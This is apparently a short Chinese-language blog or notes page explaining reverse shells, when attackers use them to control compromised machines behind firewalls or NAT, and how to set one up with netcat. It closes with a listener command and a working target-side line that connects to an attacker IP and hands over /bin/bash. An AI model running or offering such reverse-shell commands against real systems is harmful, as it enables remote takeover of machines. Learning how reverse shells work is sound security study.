# 什么是反弹 shell

reverse shell, 就是控制端监听在某 TCP/UDP 端口，被控端请求到该控制端端口，并将祺命令行的输入输出转到控制端

# 什么时候用？

通常用于被控端防火墙受限，权限不足，端口被占用等情形
假设我们攻击了一台机器，打开了该机器的一个端口，我们可以用自己的机器去连接目标机器，这种叫正向连接，远程桌面，web 服务，ssh，telnet 等等
但是以下情况：

  1. 客户机中了你的马，但是在局域网内
  2. 它的 ip 会动态改变，不能持续控制
  3. 防火墙限制，对方只能发送请求，不能接收请求
    此时只能反弹 shell，就是攻击者指定服务器，受害者主机主动连接攻击者的服务端程序

# netcat 反弹 shell

Linux 默认带 netcat 但是为了安全考虑把反弹 shell 的 - e 给删了

攻击机开启监听：
netcat -lvnp 23333
目标机主动连接：
netcat 192.168.81.122 23333 -e /bin/bash
